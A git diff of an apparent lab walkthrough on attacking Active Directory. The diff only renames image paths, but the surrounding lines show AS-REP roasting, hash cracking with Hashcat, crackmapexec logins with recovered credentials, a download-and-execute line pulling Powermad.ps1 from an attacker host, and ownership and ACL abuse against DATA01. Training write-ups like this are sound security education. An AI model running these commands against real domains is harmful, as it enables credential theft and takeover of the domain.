@@ -70,7 +70,7 @@ GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -o
 
 2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash for the user `richard`:
 
-![](<../../../.gitbook/assets/image (67) (1).png>)
+![](<../../../.gitbook/assets/image (67) (1) (1).png>)
 
 3\. We can try to crack this hash using [Hashcat](https://hashcat.net/hashcat/). I transferred the file to my host since cracking in a VM isn't really ideal since it doesn't have access to my GPU. I always run Hashcat with rockyou and the dive ruleset first. For AS-REP Roasting we need to use hashmode `-m 18200`.
 
@@ -135,7 +135,7 @@ crackmapexec smb 10.0.0.3 10.0.0.4 10.0.0.5 -u richard -p Sample123 --shares
 
 The IPC$, NETLOGON and SYSVOL shares are default. There is one interesting share with the name `Data` on `FILE01`. After connecting to the share with smbclient we see that this user unfortunately can't access any of the subdirectories:
 
-![](<../../../.gitbook/assets/image (73) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (73) (1) (1) (1) (1) (1).png>)
 
 2\. Next we can check if the user can access any systems with the winrm protocol:
 
@@ -365,7 +365,7 @@ Now we can load it into the PowerShell session in the shell:
 iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
 ```
 
-![](<../../../.gitbook/assets/image (24) (1).png>)
+![](<../../../.gitbook/assets/image (24) (1) (1).png>)
 
 Then we can create our own computerobject with the name `FAKE01` and password `123456` using the `New-MachineAccount` cmdlet from PowerMad:
 
@@ -373,7 +373,7 @@ Then we can create our own computerobject with the name `FAKE01` and password `1
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../.gitbook/assets/image (73) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (73) (1) (1) (1) (1).png>)
 
 3\. The third requirement is that the WebDav director is installed. We can check this with the following PowerShell command in the shell:
 
@@ -611,7 +611,7 @@ We were able to successfully gather the BloodHound data. We can load it by dragg
 
 We see that the user has WriteOwner permissions:
 
-![](<../../../.gitbook/assets/image (67).png>)
+![](<../../../.gitbook/assets/image (67) (1).png>)
 
 In BloodHound you can right click the Edge and click the ?Help function to get more information on how to abuse it:
 
@@ -642,7 +642,7 @@ Get-DomainObject -Identity data01 -SecurityMasks Owner -Domain secure.local -Cre
 Get-DomainObject -Identity S-1-5-21-1498997062-1091976085-892328878-512 -Domain secure.local -Credential $creds -Server 10.0.0.100
 ```
 
-![](<../../../.gitbook/assets/image (73) (1) (1).png>)
+![](<../../../.gitbook/assets/image (73) (1) (1) (1).png>)
 
 7\. The current owner of `DATA01` is the Domain Admins group. Lets change that. We can change the owner of the object using the `Set-DomainObjectOwner` cmdlet. The command below will change the owner to `sa_sql`.
 
@@ -681,7 +681,7 @@ Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetDomain secure
 crackmapexec ldap 10.0.0.100 -u sa_sql -p Iloveyou2 -M MAQ
 ```
 
-![](<../../../.gitbook/assets/image (12) (1).png>)
+![](<../../../.gitbook/assets/image (12) (1) (1).png>)
 
 Then create a credential object, load PowerMad and add a computerobject to the domain:
 
